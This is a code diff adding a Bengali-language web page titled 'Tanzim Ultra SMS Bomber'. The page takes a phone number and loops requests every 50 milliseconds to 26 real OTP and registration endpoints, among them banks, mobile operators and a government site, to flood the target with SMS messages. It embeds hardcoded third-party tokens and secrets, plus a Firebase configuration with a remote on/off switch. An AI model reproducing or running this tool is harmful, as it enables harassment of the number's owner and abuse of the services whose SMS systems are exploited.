@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tanzim Ultra SMS Bomber</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+        body { font-family: 'Orbitron', sans-serif; background: #000000; color: white; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        
+        /* Control Visibility */
+        #main-wrapper { display: none; width: 100%; display: flex; flex-direction: column; align-items: center; }
+        #maintenance-screen { display: none; text-align: center; color: #ff4d4d; border: 2px solid #ff4d4d; padding: 40px; border-radius: 20px; background: #1a0000; }
+
+        .card { max-width: 500px; width: 100%; background: #111; padding: 30px; border-radius: 20px; border: 1px solid #076fea; box-shadow: 0 0 20px #076fea66; }
+        h2 { text-align: center; color: #076fea; text-shadow: 0 0 10px #076fea; margin-bottom: 25px; }
+        input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; color: white; border-radius: 8px; box-sizing: border-box; font-family: 'Orbitron'; font-size: 16px; text-align: center; }
+        input:focus { border-color: #076fea; outline: none; box-shadow: 0 0 10px #076fea33; }
+        
+        .btn-start { background: #2ecc71; color: black; margin-top: 20px; width: 100%; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 18px; transition: 0.3s; }
+        .btn-stop { background: #e74c3c; color: white; display: none; margin-top: 20px; width: 100%; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 18px; }
+        .btn-start:hover { background: #27ae60; transform: scale(1.02); }
+        
+        .status-box { display: flex; justify-content: space-around; margin-top: 25px; background: #1a1a1a; padding: 15px; border-radius: 10px; border: 1px solid #222; }
+        .success { color: #2ecc71; font-size: 14px; } 
+        .failure { color: #e74c3c; font-size: 14px; }
+        .spinner { display: none; width: 30px; height: 30px; border: 4px solid #fff; border-top: 4px solid #076fea; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .dev { margin-top: 20px; font-size: 10px; color: #444; text-align: center; letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+
+    <div id="maintenance-screen">
+        <h1 style="font-size: 40px;">SERVER OFF</h1>
+        <p id="off-text" style="font-family: sans-serif; color: #ccc;"></p>
+    </div>
+
+    <div id="main-wrapper">
+        <div class="card">
+            <h2>SMS BOMBER</h2>
+            <div style="height: 1px; background: linear-gradient(90deg, transparent, #076fea, transparent); margin-bottom: 25px;"></div>
+            
+            <input type="number" id="number" placeholder="নাম্বার দিন (১১ ডিজিট)">
+            
+            <button id="startBtn" class="btn-start" onclick="startProcess()">বোম্বিং শুরু করুন</button>
+            <button id="stopBtn" class="btn-stop" onclick="stopProcess()">বন্ধ করুন</button>
+            
+            <div class="spinner" id="spinner"></div>
+            
+            <div class="status-box">
+                <div class="success">সফল: <span id="successCount">0</span></div>
+                <div class="failure">ব্যর্থ: <span id="failureCount">0</span></div>
+            </div>
+            <div class="dev">DEVELOPED BY TANZIM</div>
+        </div>
+    </div>
+
+    <script>
+        // --- Firebase Config & Logic (Don't Change) ---
+        const firebaseConfig = {
+          apiKey: "AIzaSyCtDWs_Ft0e2NcU-dtwaWPfy-gAXa0azQg",
+          authDomain: "tanzim-main-admin-app.firebaseapp.com",
+          databaseURL: "https://tanzim-main-admin-app-default-rtdb.firebaseio.com",
+          projectId: "tanzim-main-admin-app",
+          storageBucket: "tanzim-main-admin-app.firebasestorage.app",
+          messagingSenderId: "12436676722",
+          appId: "1:12436676722:web:f066ffbc343f0117eea2eb"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Control Logic
+        db.ref('app_control').on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.status === 'off') {
+                document.getElementById('main-wrapper').style.display = 'none';
+                document.getElementById('maintenance-screen').style.display = 'block';
+                document.getElementById('off-text').innerText = data.message || "App is currently unavailable.";
+            } else {
+                document.getElementById('main-wrapper').style.display = 'flex';
+                document.getElementById('maintenance-screen').style.display = 'none';
+            }
+        });
+
+        // --- Your Original API Code (Unchanged) ---
+        const apis = [
+            async (p) => fetch('https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp',{method:'POST',headers:{'Content-Type':'application/json','authorization':'Otp bnVsbA=='},body:JSON.stringify({"countryId":"19","mobileNumber":p,"purpose":"registration"})}),
+            async (p) => fetch(`https://chinaonlineapi.com/api/v1/get/otp?phone=${p}`,{headers:{'token':'gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219'}}),
+            async (p) => fetch("https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({"phoneNumber":"+88"+p})}),
+            async (p) => fetch("https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({number:p})}),
+            async (p) => fetch("https://user-api.jslglobal.co:444/v1/send-otp",{method:'POST',body:new URLSearchParams({phone:`+88${p}`,jatri_token:"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"})}),
+            async (p) => fetch("https://gw.jotno.net/auth/login/token",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:p})}),
+            async (p) => fetch('https://api.osudpotro.com/api/v1/users/send_otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mobile:'+88-'+p,deviceToken:'app',language:'bn',os:'android'})}),
+            async (p) => fetch('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({full_name:"Hangama",phone_number:p})}),
+            async (p) => fetch("https://developer.quizgiri.xyz/api/v2.0/send-otp",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({country_code:"+880",phone:p})}),
+            async (p) => fetch("https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({country_code:"+88",phone:p})}),
+            async (p) => fetch('https://api.shikho.com/auth/v2/send/sms',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,type:'student',auth_type:'signup',vendor:'shikho'})}),
+            async (p) => fetch('https://api.toybox.live/bdapps_handler.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({"Operation":"CreateSubscription","MobileNumber":"88"+p,"PackageID":100,"Secret":"HJKX71%UHYH"})}),
+            async (p) => fetch('https://api.betonbook.com/api/v5/auth/otp/request',{method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({phone:p,language:1})}),
+            async (p) => fetch('https://applink.com.bd/appstore-v4-server/login/otp/request',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({"msisdn":"88"+p})}),
+            async (p) => fetch("https://webapi.robi.com.bd/v1/send-otp",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone_number:p,type:'my_offer'})}),
+            async (p) => fetch("https://webapi.robi.com.bd/v1/account/register/otp",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone_number:p})}),
+            async (p) => fetch("https://softmaxmanager.xyz/api/v1/user/request/otp/",{method:'POST',body:new URLSearchParams({'phone_number':'+88'+p,'app_signature':'Fu89B%2BdY9dz'})}),
+            async (p) => fetch("https://training.gov.bd/backoffice/api/user/sendOtp",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mobile:p})}),
+            async (p) => fetch("https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:{contact_no:p,country_calling_code:'88'}})}),
+            async (p) => fetch("https://core.easy.com.bd/api/v1/registration",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mobile:p,"password":"boss#2022"})}),
+            async (p) => fetch('https://eshop-api.banglalink.net/api/v1/customer/send-otp',{method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"phone",phone:p})}),
+            async (p) => fetch(`https://app.hishabee.business/api/V2/otp/send?mobile_number=${p}`,{method:'POST'}),
+            async (p) => fetch(`https://www.skitto.com/replace-sim/sent-otp/${p}`),
+            async (p) => fetch("https://da-api.robi.com.bd/da-nll/otp/send",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({msisdn:p})}),
+            async (p) => fetch("https://api.chardike.com/api/otp/send",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p,otp_type:"login"})}),
+            async (p) => fetch('https://api.apex4u.com/api/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({"phoneNumber":p})})
+        ];
+
+        let isRunning = false;
+        let success = 0; 
+        let fail = 0;
+
+        async function startProcess() {
+            const num = document.getElementById('number').value;
+            if(num.length !== 11) return alert("সঠিক ১১ ডিজিট নাম্বার দিন!");
+            
+            isRunning = true;
+            success = 0; fail = 0;
+            document.getElementById('successCount').innerText = 0;
+            document.getElementById('failureCount').innerText = 0;
+            updateUI(true);
+
+            let i = 0;
+            while(isRunning) {
+                let apiIdx = i % apis.length;
+                
+                apis[apiIdx](num).then(res => {
+                    if(res.ok) { 
+                        success++; 
+                        document.getElementById('successCount').innerText = success; 
+                    } else { 
+                        fail++; 
+                        document.getElementById('failureCount').innerText = fail; 
+                    }
+                }).catch(() => {
+                    fail++; 
+                    document.getElementById('failureCount').innerText = fail;
+                });
+
+                i++;
+                await new Promise(r => setTimeout(r, 50)); 
+            }
+        }
+
+        function stopProcess() {
+            isRunning = false;
+            updateUI(false);
+        }
+
+        function updateUI(active) {
+            document.getElementById('spinner').style.display = active ? 'block' : 'none';
+            document.getElementById('startBtn').style.display = active ? 'none' : 'block';
+            document.getElementById('stopBtn').style.display = active ? 'block' : 'none';
+            document.getElementById('number').disabled = active;
+        }
+    </script>
+</body>
+</html>
